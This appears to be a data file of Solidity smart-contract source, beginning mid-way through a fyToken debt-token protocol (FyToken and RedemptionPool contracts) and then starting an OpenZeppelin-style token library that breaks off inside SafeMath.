external\n\n        virtual\n\n        returns (bool);\n\n\n\n    function setDebtCeiling(FyTokenInterface fyToken, uint256 newDebtCeiling) external virtual returns (bool);\n\n\n\n    function setDepositCollateralAllowed(FyTokenInterface fyToken, bool state) external virtual returns (bool);\n\n\n\n    function setLiquidateBorrowAllowed(FyTokenInterface fyToken, bool state) external virtual returns (bool);\n\n\n\n    function setLiquidationIncentive(uint256 newLiquidationIncentiveMantissa) external virtual returns (bool);\n\n\n\n    function setOracle(UniswapAnchoredViewInterface newOracle) external virtual returns (bool);\n\n\n\n    function setRedeemFyTokensAllowed(FyTokenInterface fyToken, bool state) external virtual returns (bool);\n\n\n\n    function setRepayBorrowAllowed(FyTokenInterface fyToken, bool state) external virtual returns (bool);\n\n\n\n    function setSupplyUnderlyingAllowed(FyTokenInterface fyToken, bool state) external virtual returns (bool);\n\n\n\n    /**\n\n     * EVENTS\n\n     */\n\n    event ListBond(address indexed admin, FyTokenInterface indexed fyToken);\n\n\n\n    event SetBorrowAllowed(address indexed admin, FyTokenInterface indexed fyToken, bool state);\n\n\n\n    event SetCollateralizationRatio(\n\n        address indexed admin,\n\n        FyTokenInterface indexed fyToken,\n\n        uint256 oldCollateralizationRatio,\n\n        uint256 newCollateralizationRatio\n\n    );\n\n\n\n    event SetDebtCeiling(\n\n        address indexed admin,\n\n        FyTokenInterface indexed fyToken,\n\n        uint256 oldDebtCeiling,\n\n        uint256 newDebtCeiling\n\n    );\n\n\n\n    event SetDepositCollateralAllowed(address indexed admin, FyTokenInterface indexed fyToken, bool state);\n\n\n\n    event SetLiquidateBorrowAllowed(address indexed admin, FyTokenInterface indexed fyToken, bool state);\n\n\n\n    event SetLiquidationIncentive(\n\n        address indexed admin,\n\n        uint256 oldLiquidationIncentive,\n\n        uint256 newLiquidationIncentive\n\n    );\n\n\n\n    event SetRedeemFyTokensAllowed(address indexed admin, FyTokenInterface indexed fyToken, bool state);\n\n\n\n    event SetRepayBorrowAllowed(address indexed admin, FyTokenInterface indexed fyToken, bool state);\n\n\n\n    event SetOracle(address indexed admin, address oldOracle, address newOracle);\n\n\n\n    event SetSupplyUnderlyingAllowed(address indexed admin, FyTokenInterface indexed fyToken, bool state);\n\n}\n\ncontract FyToken is\n\n    ReentrancyGuard, /* no depedency */\n\n    FyTokenInterface, /* one dependency */\n\n    Admin, /* two dependencies */\n\n    Exponential, /* two dependencies */\n\n    Erc20, /* three dependencies */\n\n    Erc20Permit, /* five dependencies */\n\n    Erc20Recover /* five dependencies */\n\n{\n\n    modifier isVaultOpen(address account) {\n\n        require(balanceSheet.isVaultOpen(this, account), "ERR_VAULT_NOT_OPEN");\n\n        _;\n\n    }\n\n\n\n    /**\n\n     * @notice The fyToken always has 18 decimals.\n\n     * @param name_ Erc20 name of this token.\n\n     * @param symbol_ Erc20 symbol of this token.\n\n     * @param expirationTime_ Unix timestamp in seconds for when this token expires.\n\n     * @param fintroller_ The address of the Fintroller contract.\n\n     * @param balanceSheet_ The address of the BalanceSheet contract.\n\n     * @param underlying_ The contract address of the underlying asset.\n\n     * @param collateral_ The contract address of the collateral asset.\n\n     */\n\n    constructor(\n\n        string memory name_,\n\n        string memory symbol_,\n\n        uint256 expirationTime_,\n\n        FintrollerInterface fintroller_,\n\n        BalanceSheetInterface balanceSheet_,\n\n        Erc20Interface underlying_,\n\n        Erc20Interface collateral_\n\n    ) Erc20Permit(name_, symbol_, 18) Admin() {\n\n        uint8 defaultNumberOfDecimals = 18;\n\n\n\n        /* Set the underlying contract and calculate the decimal scalar offsets. */\n\n        uint256 underlyingDecimals = underlying_.decimals();\n\n        require(underlyingDecimals > 0, "ERR_FYTOKEN_CONSTRUCTOR_UNDERLYING_DECIMALS_ZERO");\n\n        require(underlyingDecimals <= defaultNumberOfDecimals, "ERR_FYTOKEN_CONSTRUCTOR_UNDERLYING_DECIMALS_OVERFLOW");\n\n        underlyingPrecisionScalar = 10**(defaultNumberOfDecimals - underlyingDecimals);\n\n        underlying = underlying_;\n\n\n\n        /* Set the collateral contract and calculate the decimal scalar offsets. */\n\n        uint256 collateralDecimals = collateral_.decimals();\n\n        require(collateralDecimals > 0, "ERR_FYTOKEN_CONSTRUCTOR_COLLATERAL_DECIMALS_ZERO");\n\n        require(defaultNumberOfDecimals >= collateralDecimals, "ERR_FYTOKEN_CONSTRUCTOR_COLLATERAL_DECIMALS_OVERFLOW");\n\n        collateralPrecisionScalar = 10**(defaultNumberOfDecimals - collateralDecimals);\n\n        collateral = collateral_;\n\n\n\n        /* Set the unix expiration time. */\n\n        require(expirationTime_ > block.timestamp, "ERR_FYTOKEN_CONSTRUCTOR_EXPIRATION_TIME_NOT_VALID");\n\n        expirationTime = expirationTime_;\n\n\n\n        /* Set the Fintroller contract and sanity check it. */\n\n        fintroller = fintroller_;\n\n        fintroller.isFintroller();\n\n\n\n        /* Set the Balance Sheet contract and sanity check it. */\n\n        balanceSheet = balanceSheet_;\n\n        balanceSheet.isBalanceSheet();\n\n\n\n        /* Create the Redemption Pool contract and transfer the owner from the fyToken itself to the current caller. */\n\n        redemptionPool = new RedemptionPool(fintroller_, this);\n\n        AdminInterface(address(redemptionPool))._transferAdmin(msg.sender);\n\n    }\n\n\n\n    /**\n\n     * NON-CONSTANT FUNCTIONS\n\n     */\n\n\n\n    struct BorrowLocalVars {\n\n        MathError mathErr;\n\n        uint256 debt;\n\n        uint256 debtCeiling;\n\n        uint256 lockedCollateral;\n\n        uint256 hypotheticalCollateralizationRatioMantissa;\n\n        uint256 hypotheticalTotalSupply;\n\n        uint256 newDebt;\n\n        uint256 thresholdCollateralizationRatioMantissa;\n\n    }\n\n\n\n    /**\n\n     * @notice Increases the debt of the caller and mints new fyToken.\n\n     *\n\n     * @dev Emits a {Borrow}, {Mint} and {Transfer} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The vault must be open.\n\n     * - Must be called prior to maturation.\n\n     * - The amount to borrow cannot be zero.\n\n     * - The Fintroller must allow this action to be performed.\n\n     * - The locked collateral cannot be zero.\n\n     * - The total supply of fyTokens cannot exceed the debt ceiling.\n\n     * - The caller must not fall below the threshold collateralization ratio.\n\n     *\n\n     * @param borrowAmount The amount of fyTokens to borrow and print into existence.\n\n     * @return bool true = success, otherwise it reverts.\n\n     */\n\n    function borrow(uint256 borrowAmount) public override isVaultOpen(msg.sender) nonReentrant returns (bool) {\n\n        BorrowLocalVars memory vars;\n\n\n\n        /* Checks: bond not matured. */\n\n        require(isMatured() == false, "ERR_BOND_MATURED");\n\n\n\n        /* Checks: the zero edge case. */\n\n        require(borrowAmount > 0, "ERR_BORROW_ZERO");\n\n\n\n        /* Checks: the Fintroller allows this action to be performed. */\n\n        require(fintroller.getBorrowAllowed(this), "ERR_BORROW_NOT_ALLOWED");\n\n\n\n        /* Checks: debt ceiling. */\n\n        (vars.mathErr, vars.hypotheticalTotalSupply) = addUInt(totalSupply, borrowAmount);\n\n        require(vars.mathErr == MathError.NO_ERROR, "ERR_BORROW_MATH_ERROR");\n\n        vars.debtCeiling = fintroller.getBondDebtCeiling(this);\n\n        require(vars.hypotheticalTotalSupply <= vars.debtCeiling, "ERR_BORROW_DEBT_CEILING_OVERFLOW");\n\n\n\n        /* Add the borrow amount to the account\'s current debt. */\n\n        (vars.debt, , vars.lockedCollateral, ) = balanceSheet.getVault(this, msg.sender);\n\n        require(vars.lockedCollateral > 0, "ERR_BORROW_LOCKED_COLLATERAL_ZERO");\n\n        (vars.mathErr, vars.newDebt) = addUInt(vars.debt, borrowAmount);\n\n        require(vars.mathErr == MathError.NO_ERROR, "ERR_BORROW_MATH_ERROR");\n\n\n\n        /* Checks: the hypothetical collateralization ratio is above the threshold. */\n\n        vars.hypotheticalCollateralizationRatioMantissa = balanceSheet.getHypotheticalCollateralizationRatio(\n\n            this,\n\n            msg.sender,\n\n            vars.lockedCollateral,\n\n            vars.newDebt\n\n        );\n\n        vars.thresholdCollateralizationRatioMantissa = fintroller.getBondCollateralizationRatio(this);\n\n        require(\n\n            vars.hypotheticalCollateralizationRatioMantissa >= vars.thresholdCollateralizationRatioMantissa,\n\n            "ERR_BELOW_COLLATERALIZATION_RATIO"\n\n        );\n\n\n\n        /* Effects: print the new fyTokens into existence. */\n\n        mintInternal(msg.sender, borrowAmount);\n\n\n\n        /* Interactions: increase the debt of the account. */\n\n        require(balanceSheet.setVaultDebt(this, msg.sender, vars.newDebt), "ERR_BORROW_CALL_SET_VAULT_DEBT");\n\n\n\n        /* Emit a Borrow, Mint and Transfer event. */\n\n        emit Borrow(msg.sender, borrowAmount);\n\n        emit Transfer(address(this), msg.sender, borrowAmount);\n\n\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @notice Destroys `burnAmount` tokens from `holder`, reducing the token supply.\n\n     *\n\n     * @dev Emits a {Burn} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Must be called prior to maturation.\n\n     * - Can only be called by the Redemption Pool.\n\n     * - The amount to burn cannot be zero.\n\n     *\n\n     * @param holder The account whose fyTokens to burn.\n\n     * @param burnAmount The amount of fyTokens to burn.\n\n     * @return bool true = success, otherwise it reverts.\n\n     */\n\n    function burn(address holder, uint256 burnAmount) external override nonReentrant returns (bool) {\n\n        /* Checks: the caller is the Redemption Pool. */\n\n        require(msg.sender == address(redemptionPool), "ERR_BURN_NOT_AUTHORIZED");\n\n\n\n        /* Checks: the zero edge case. */\n\n        require(burnAmount > 0, "ERR_BURN_ZERO");\n\n\n\n        /* Effects: burns the fyTokens. */\n\n        burnInternal(holder, burnAmount);\n\n\n\n        return true;\n\n    }\n\n\n\n    struct LiquidateBorrowsLocalVars {\n\n        MathError mathErr;\n\n        uint256 collateralizationRatioMantissa;\n\n        uint256 lockedCollateral;\n\n        bool isAccountUnderwater;\n\n    }\n\n\n\n    /**\n\n     * @notice Repays the debt of the borrower and rewards the liquidator with a surplus\n\n     * of collateral.\n\n     *\n\n     * @dev Emits a {RepayBorrow}, {Transfer}, {ClutchCollateral} and {LiquidateBorrow} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The vault must be open.\n\n     * - The liquidator cannot liquidate themselves.\n\n     * - The amount to repay cannot be zero.\n\n     * - The Fintroller must allow this action to be performed.\n\n     * - The borrower must be underwater if the bond didn\'t mature.\n\n     * - The caller must have at least `repayAmount` fyTokens.\n\n     * - The borrower must have at least `repayAmount` debt.\n\n     * - The collateral clutch cannot be more than what the borrower has in the vault.\n\n     *\n\n     * @param borrower The account to liquidate.\n\n     * @param repayAmount The amount of fyTokens to repay.\n\n     * @return true = success, otherwise it reverts.\n\n     */\n\n    function liquidateBorrow(address borrower, uint256 repayAmount)\n\n        external\n\n        override\n\n        isVaultOpen(borrower)\n\n        nonReentrant\n\n        returns (bool)\n\n    {\n\n        LiquidateBorrowsLocalVars memory vars;\n\n\n\n        /* Checks: borrowers cannot self liquidate. */\n\n        require(msg.sender != borrower, "ERR_LIQUIDATE_BORROW_SELF");\n\n\n\n        /* Checks: the zero edge case. */\n\n        require(repayAmount > 0, "ERR_LIQUIDATE_BORROW_ZERO");\n\n\n\n        /* Checks: the Fintroller allows this action to be performed. */\n\n        require(fintroller.getLiquidateBorrowAllowed(this), "ERR_LIQUIDATE_BORROW_NOT_ALLOWED");\n\n\n\n        /* After maturation, any vault can be liquidated, irrespective of collateralization ratio. */\n\n        if (isMatured() == false) {\n\n            /* Checks: the borrower fell below the threshold collateraliation ratio. */\n\n            vars.isAccountUnderwater = balanceSheet.isAccountUnderwater(this, borrower);\n\n            require(vars.isAccountUnderwater, "ERR_ACCOUNT_NOT_UNDERWATER");\n\n        }\n\n\n\n        /* Effects & Interactions: repay the borrower\'s debt. */\n\n        repayBorrowInternal(msg.sender, borrower, repayAmount);\n\n\n\n        /* Interactions: clutch the collateral. */\n\n        uint256 clutchableCollateralAmount = balanceSheet.getClutchableCollateral(this, repayAmount);\n\n        require(\n\n            balanceSheet.clutchCollateral(this, msg.sender, borrower, clutchableCollateralAmount),\n\n            "ERR_LIQUIDATE_BORROW_CALL_CLUTCH_COLLATERAL"\n\n        );\n\n\n\n        emit LiquidateBorrow(msg.sender, borrower, repayAmount, clutchableCollateralAmount);\n\n\n\n        return true;\n\n    }\n\n\n\n    /**\n\n    /** @notice Prints new tokens into existence and assigns them to `beneficiary`,\n\n     * increasing the total supply.\n\n     *\n\n     * @dev Emits a {Mint} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Can only be called by the Redemption Pool.\n\n     * - The amount to mint cannot be zero.\n\n     *\n\n     * @param beneficiary The account for which to mint the tokens.\n\n     * @param mintAmount The amount of fyTokens to print into existence.\n\n     * @return bool true = success, otherwise it reverts.\n\n     */\n\n    function mint(address beneficiary, uint256 mintAmount) external override nonReentrant returns (bool) {\n\n        /* Checks: the caller is the Redemption Pool. */\n\n        require(msg.sender == address(redemptionPool), "ERR_MINT_NOT_AUTHORIZED");\n\n\n\n        /* Checks: the zero edge case. */\n\n        require(mintAmount > 0, "ERR_MINT_ZERO");\n\n\n\n        /* Effects: print the new fyTokens into existence. */\n\n        mintInternal(beneficiary, mintAmount);\n\n\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @notice Deletes the account\'s debt from the registry and take the fyTokens out of circulation.\n\n     * @dev Emits a {Burn}, {Transfer} and {RepayBorrow} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The vault must be open.\n\n     * - The amount to repay cannot be zero.\n\n     * - The Fintroller must allow this action to be performed.\n\n     * - The caller must have at least `repayAmount` fyTokens.\n\n     * - The caller must have at least `repayAmount` debt.\n\n     *\n\n     * @param repayAmount Lorem ipsum.\n\n     * @return true = success, otherwise it reverts.\n\n     */\n\n    function repayBorrow(uint256 repayAmount) external override isVaultOpen(msg.sender) nonReentrant returns (bool) {\n\n        repayBorrowInternal(msg.sender, msg.sender, repayAmount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @notice Clears the borrower\'s debt from the registry and take the fyTokens out of circulation.\n\n     * @dev Emits a {Burn}, {Transfer} and {RepayBorrow} event.\n\n     *\n\n     * Requirements: same as the `repayBorrow` function, but here `borrower` is the account that must\n\n     * have at least `repayAmount` fyTokens to repay the borrow.\n\n     *\n\n     * @param borrower The account for which to repay the borrow.\n\n     * @param repayAmount The amount of fyTokens to repay.\n\n     * @return true = success, otherwise it reverts.\n\n     */\n\n    function repayBorrowBehalf(address borrower, uint256 repayAmount)\n\n        external\n\n        override\n\n        isVaultOpen(borrower)\n\n        nonReentrant\n\n        returns (bool)\n\n    {\n\n        repayBorrowInternal(msg.sender, borrower, repayAmount);\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * @notice Updates the Fintroller contract\'s address saved in storage.\n\n     *\n\n     * @dev Throws a {SetFintroller} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The caller must be the administrator.\n\n     *\n\n     * @return bool true = success, otherwise it reverts.\n\n     */\n\n    function _setFintroller(FintrollerInterface newFintroller) external override onlyAdmin returns (bool) {\n\n        /* Checks: sanity check the new contract. */\n\n        newFintroller.isFintroller();\n\n\n\n        /* Effects: update storage. */\n\n        FintrollerInterface oldFintroller = fintroller;\n\n        fintroller = newFintroller;\n\n\n\n        emit SetFintroller(admin, oldFintroller, newFintroller);\n\n\n\n        return true;\n\n    }\n\n\n\n    /**\n\n     * INTERNAL FUNCTIONS\n\n     */\n\n\n\n    /**\n\n     * @dev Checks if the bond matured.\n\n     */\n\n    function isMatured() internal view returns (bool) {\n\n        return block.timestamp >= expirationTime;\n\n    }\n\n\n\n    /**\n\n     * @dev See the documentation for the public functions that call this internal function.\n\n     */\n\n    function repayBorrowInternal(\n\n        address payer,\n\n        address borrower,\n\n        uint256 repayAmount\n\n    ) internal {\n\n        /* Checks: the zero edge case. */\n\n        require(repayAmount > 0, "ERR_REPAY_BORROW_ZERO");\n\n\n\n        /* Checks: the Fintroller allows this action to be performed. */\n\n        require(fintroller.getRepayBorrowAllowed(this), "ERR_REPAY_BORROW_NOT_ALLOWED");\n\n\n\n        /* Checks: borrower has a debt to pay. */\n\n        uint256 debt = balanceSheet.getVaultDebt(this, borrower);\n\n        require(debt >= repayAmount, "ERR_REPAY_BORROW_INSUFFICIENT_DEBT");\n\n\n\n        /* Checks: the payer has enough fyTokens. */\n\n        require(balanceOf(payer) >= repayAmount, "ERR_REPAY_BORROW_INSUFFICIENT_BALANCE");\n\n\n\n        /* Effects: burn the fyTokens. */\n\n        burnInternal(payer, repayAmount);\n\n\n\n        /* Calculate the new debt of the borrower. */\n\n        MathError mathErr;\n\n        uint256 newDebt;\n\n        (mathErr, newDebt) = subUInt(debt, repayAmount);\n\n        /* This operation can\'t fail because of the previous `require`. */\n\n        assert(mathErr == MathError.NO_ERROR);\n\n\n\n        /* Interactions: reduce the debt of the borrower . */\n\n        require(balanceSheet.setVaultDebt(this, borrower, newDebt), "ERR_REPAY_BORROW_CALL_SET_VAULT_DEBT");\n\n\n\n        /* Emit both a Transfer and a RepayBorrow event. */\n\n        emit Transfer(payer, address(this), repayAmount);\n\n        emit RepayBorrow(payer, borrower, repayAmount, newDebt);\n\n    }\n\n}\n\ncontract RedemptionPool is\n\n    CarefulMath, /* no dependency */\n\n    ReentrancyGuard, /* no dependency */\n\n    RedemptionPoolInterface, /* one dependency */\n\n    Admin, /* two dependencies */\n\n    Erc20Recover /* five dependencies */\n\n{\n\n    using SafeErc20 for Erc20Interface;\n\n\n\n    /**\n\n     * @param fintroller_ The address of the Fintroller contract.\n\n     * @param fyToken_ The address of the fyToken contract.\n\n     */\n\n    constructor(FintrollerInterface fintroller_, FyTokenInterface fyToken_) Admin() {\n\n        /* Set the Fintroller contract and sanity check it. */\n\n        fintroller = fintroller_;\n\n        fintroller.isFintroller();\n\n\n\n        /**\n\n         * Set the fyToken contract. It cannot be sanity-checked because the fyToken creates this\n\n         * contract in its own constructor and contracts cannot be called while initializing.\n\n         */\n\n        fyToken = fyToken_;\n\n    }\n\n\n\n    struct RedeemFyTokensLocalVars {\n\n        MathError mathErr;\n\n        uint256 newUnderlyingTotalSupply;\n\n        uint256 underlyingPrecisionScalar;\n\n        uint256 underlyingAmount;\n\n    }\n\n\n\n    /**\n\n     * @notice Pays the token holder the face value at maturation time.\n\n     *\n\n     * @dev Emits a {RedeemFyTokens} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Must be called post maturation.\n\n     * - The amount to redeem cannot be zero.\n\n     * - The Fintroller must allow this action to be performed.\n\n     * - There must be enough liquidity in the Redemption Pool.\n\n     *\n\n     * @param fyTokenAmount The amount of fyTokens to redeem for the underlying asset.\n\n     * @return true = success, otherwise it reverts.\n\n     */\n\n    function redeemFyTokens(uint256 fyTokenAmount) external override nonReentrant returns (bool) {\n\n        RedeemFyTokensLocalVars memory vars;\n\n\n\n        /* Checks: maturation time. */\n\n        require(block.timestamp >= fyToken.expirationTime(), "ERR_BOND_NOT_MATURED");\n\n\n\n        /* Checks: the zero edge case. */\n\n        require(fyTokenAmount > 0, "ERR_REDEEM_FYTOKENS_ZERO");\n\n\n\n        /* Checks: the Fintroller allows this action to be performed. */\n\n        require(fintroller.getRedeemFyTokensAllowed(fyToken), "ERR_REDEEM_FYTOKENS_NOT_ALLOWED");\n\n\n\n        /* Checks: there is enough liquidity. */\n\n        require(fyTokenAmount <= totalUnderlyingSupply, "ERR_REDEEM_FYTOKENS_INSUFFICIENT_UNDERLYING");\n\n\n\n        /**\n\n         * fyTokens always have 18 decimals so the underlying amount needs to be downscaled.\n\n         * If the precision scalar is 1, it means that the underlying also has 18 decimals.\n\n         */\n\n        vars.underlyingPrecisionScalar = fyToken.underlyingPrecisionScalar();\n\n        if (vars.underlyingPrecisionScalar != 1) {\n\n            (vars.mathErr, vars.underlyingAmount) = divUInt(fyTokenAmount, vars.underlyingPrecisionScalar);\n\n            require(vars.mathErr == MathError.NO_ERROR, "ERR_REDEEM_FYTOKENS_MATH_ERROR");\n\n        } else {\n\n            vars.underlyingAmount = fyTokenAmount;\n\n        }\n\n\n\n        /* Effects: decrease the remaining supply of underlying. */\n\n        (vars.mathErr, vars.newUnderlyingTotalSupply) = subUInt(totalUnderlyingSupply, vars.underlyingAmount);\n\n        assert(vars.mathErr == MathError.NO_ERROR);\n\n        totalUnderlyingSupply = vars.newUnderlyingTotalSupply;\n\n\n\n        /* Interactions: burn the fyTokens. */\n\n        require(fyToken.burn(msg.sender, fyTokenAmount), "ERR_SUPPLY_UNDERLYING_CALL_BURN");\n\n\n\n        /* Interactions: perform the Erc20 transfer. */\n\n        fyToken.underlying().safeTransfer(msg.sender, vars.underlyingAmount);\n\n\n\n        emit RedeemFyTokens(msg.sender, fyTokenAmount, vars.underlyingAmount);\n\n\n\n        return true;\n\n    }\n\n\n\n    struct SupplyUnderlyingLocalVars {\n\n        MathError mathErr;\n\n        uint256 newUnderlyingTotalSupply;\n\n        uint256 underlyingPrecisionScalar;\n\n        uint256 fyTokenAmount;\n\n    }\n\n\n\n    /**\n\n     * @notice An alternative to the usual minting method that does not involve taking on debt.\n\n     *\n\n     * @dev Emits a {SupplyUnderlying} event.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Must be called prior to maturation.\n\n     * - The amount to supply cannot be zero.\n\n     * - The Fintroller must allow this action to be performed.\n\n     * - The caller must have allowed this contract to spend `underlyingAmount` tokens.\n\n     *\n\n     * @param underlyingAmount The amount of underlying to supply to the Redemption Pool.\n\n     * @return true = success, otherwise it reverts.\n\n     */\n\n    function supplyUnderlying(uint256 underlyingAmount) external override nonReentrant returns (bool) {\n\n        SupplyUnderlyingLocalVars memory vars;\n\n\n\n        /* Checks: maturation time. */\n\n        require(block.timestamp < fyToken.expirationTime(), "ERR_BOND_MATURED");\n\n\n\n        /* Checks: the zero edge case. */\n\n        require(underlyingAmount > 0, "ERR_SUPPLY_UNDERLYING_ZERO");\n\n\n\n        /* Checks: the Fintroller allows this action to be performed. */\n\n        require(fintroller.getSupplyUnderlyingAllowed(fyToken), "ERR_SUPPLY_UNDERLYING_NOT_ALLOWED");\n\n\n\n        /* Effects: update storage. */\n\n        (vars.mathErr, vars.newUnderlyingTotalSupply) = addUInt(totalUnderlyingSupply, underlyingAmount);\n\n        require(vars.mathErr == MathError.NO_ERROR, "ERR_SUPPLY_UNDERLYING_MATH_ERROR");\n\n        totalUnderlyingSupply = vars.newUnderlyingTotalSupply;\n\n\n\n        /**\n\n         * fyTokens always have 18 decimals so the underlying amount needs to be upscaled.\n\n         * If the precision scalar is 1, it means that the underlying also has 18 decimals.\n\n         */\n\n        vars.underlyingPrecisionScalar = fyToken.underlyingPrecisionScalar();\n\n        if (vars.underlyingPrecisionScalar != 1) {\n\n            (vars.mathErr, vars.fyTokenAmount) = mulUInt(underlyingAmount, vars.underlyingPrecisionScalar);\n\n            require(vars.mathErr == MathError.NO_ERROR, "ERR_SUPPLY_UNDERLYING_MATH_ERROR");\n\n        } else {\n\n            vars.fyTokenAmount = underlyingAmount;\n\n        }\n\n\n\n        /* Interactions: mint the fyTokens. */\n\n        require(fyToken.mint(msg.sender, vars.fyTokenAmount), "ERR_SUPPLY_UNDERLYING_CALL_MINT");\n\n\n\n        /* Interactions: perform the Erc20 transfer. */\n\n        fyToken.underlying().safeTransferFrom(msg.sender, address(this), underlyingAmount);\n\n\n\n        emit SupplyUnderlying(msg.sender, underlyingAmount, vars.fyTokenAmount);\n\n\n\n        return true;\n\n    }\n\n}\n', 'pragma solidity 0.5.10;\n\ncontract Context {\n\n    // Empty internal constructor, to prevent people from mistakenly deploying\n\n    // an instance of this contract, which should be used via inheritance.\n\n    constructor () internal { }\n\n    // solhint-disable-previous-line no-empty-blocks\n\n\n\n    function _msgSender() internal view returns (address payable) {\n\n        return msg.sender;\n\n    }\n\n\n\n    function _msgData() internal view returns (bytes memory) {\n\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n\n        return msg.data;\n\n    }\n\n}\n\ninterface IERC20 {\n\n    /**\n\n     * @dev Returns the amount of tokens in existence.\n\n     */\n\n    function totalSupply() external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Returns the amount of tokens owned by `account`.\n\n     */\n\n    function balanceOf(address account) external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from the caller\'s account to `recipient`.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     */\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Returns the remaining number of tokens that `spender` will be\n\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n\n     * zero by default.\n\n     *\n\n     * This value changes when {approve} or {transferFrom} are called.\n\n     */\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Sets `amount` as the allowance of `spender` over the caller\'s tokens.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n\n     * that someone may use both the old and the new allowance by unfortunate\n\n     * transaction ordering. One possible solution to mitigate this race\n\n     * condition is to first reduce the spender\'s allowance to 0 and set the\n\n     * desired value afterwards:\n\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n\n     *\n\n     * Emits an {Approval} event.\n\n     */\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n\n     * allowance mechanism. `amount` is then deducted from the caller\'s\n\n     * allowance.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     */\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n\n     * another (`to`).\n\n     *\n\n     * Note that `value` may be zero.\n\n     */\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n\n\n    /**\n\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n\n     * a call to {approve}. `value` is the new allowance.\n\n     */\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n}\n\nlibrary Math {\n\n    /**\n\n     * @dev Returns the largest of two numbers.\n\n     */\n\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return a >= b ? a : b;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the smallest of two numbers.\n\n     */\n\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return a < b ? a : b;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the average of two numbers. The result is rounded towards\n\n     * zero.\n\n     */\n\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        // (a + b) / 2 can overflow, so we distribute\n\n        return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2);\n\n    }\n\n}\n\ncontract MinterRole is Context {\n\n    using Roles for Roles.Role;\n\n\n\n    event MinterAdded(address indexed account);\n\n    event MinterRemoved(address indexed account);\n\n\n\n    Roles.Role private _minters;\n\n\n\n    constructor () internal {\n\n        _addMinter(_msgSender());\n\n    }\n\n\n\n    modifier onlyMinter() {\n\n        require(isMinter(_msgSender()), "MinterRole: caller does not have the Minter role");\n\n        _;\n\n    }\n\n\n\n    function isMinter(address account) public view returns (bool) {\n\n        return _minters.has(account);\n\n    }\n\n\n\n    function addMinter(address account) public onlyMinter {\n\n        _addMinter(account);\n\n    }\n\n\n\n    function renounceMinter() public {\n\n        _removeMinter(_msgSender());\n\n    }\n\n\n\n    function _addMinter(address account) internal {\n\n        _minters.add(account);\n\n        emit MinterAdded(account);\n\n    }\n\n\n\n    function _removeMinter(address account) internal {\n\n        _minters.remove(account);\n\n        emit MinterRemoved(account);\n\n    }\n\n}\n\nlibrary Roles {\n\n    struct Role {\n\n        mapping (address => bool) bearer;\n\n    }\n\n\n\n    /**\n\n     * @dev Give an account access to this role.\n\n     */\n\n    function add(Role storage role, address account) internal {\n\n        require(!has(role, account), "Roles: account already has role");\n\n        role.bearer[account] = true;\n\n    }\n\n\n\n    /**\n\n     * @dev Remove an account\'s access to this role.\n\n     */\n\n    function remove(Role storage role, address account) internal {\n\n        require(has(role, account), "Roles: account does not have role");\n\n        role.bearer[account] = false;\n\n    }\n\n\n\n    /**\n\n     * @dev Check if an account has this role.\n\n     * @return bool\n\n     */\n\n    function has(Role storage role, address account) internal view returns (bool) {\n\n        require(account != address(0), "Roles: account is the zero address");\n\n        return role.bearer[account];\n\n    }\n\n}\n\nlibrary SafeMath {\n\n    /**\n\n     * @dev Returns the addition of two unsigned integers, reverting on\n\n     * overflow.\n\n     *\n\n     * Counterpart to Solidity\'s `+` operator.\n\n     *\n\n     * Requirements:\n\n     * - Addition cannot overflow.\n\n     */\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        uint256 c = a + b;\n\n        require(c >= a, "SafeMath: addition overflow");\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n\n     * overflow (when the result is negative).\n\n     *\n\n     * Counterpart to Solidity\'s `-` operator.\n\n     *\n\n     * Requirements:\n\n     * - Subtraction cannot overflow.\n\n     */\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return sub(a, b, "SafeMath: subtraction overflow");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n\n     * overflow (when the result is negative).\n\n     *\n\n     * Counterpart to Solidity\'s `-` operator.\n\n     *\n\n     * Requirements:\n\n     * - Subtraction cannot overflow.\n\n     *\n\n     * _Available since v2.4.0._\n\n     */\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns 